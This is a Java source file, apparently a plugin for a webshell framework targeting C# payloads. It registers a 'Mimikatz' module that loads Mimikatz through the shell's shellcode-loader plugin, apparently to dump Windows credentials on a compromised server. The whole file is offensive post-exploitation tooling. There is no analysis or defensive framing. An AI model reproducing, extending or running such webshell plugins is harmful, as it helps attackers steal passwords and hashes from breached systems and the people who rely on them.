package shells.plugins.cshap;

import core.annotation.PluginAnnotation;

@PluginAnnotation(
   payloadName = "CShapDynamicPayload",
   Name = "Mimikatz",
   DisplayName = "Mimikatz"
)
public class Mimikatz extends shells.plugins.generic.Mimikatz {
   protected shells.plugins.generic.ShellcodeLoader getShellcodeLoader() {
      return (shells.plugins.generic.ShellcodeLoader)super.shellEntity.getFrame().getPlugin("ShellcodeLoader");
   }
}
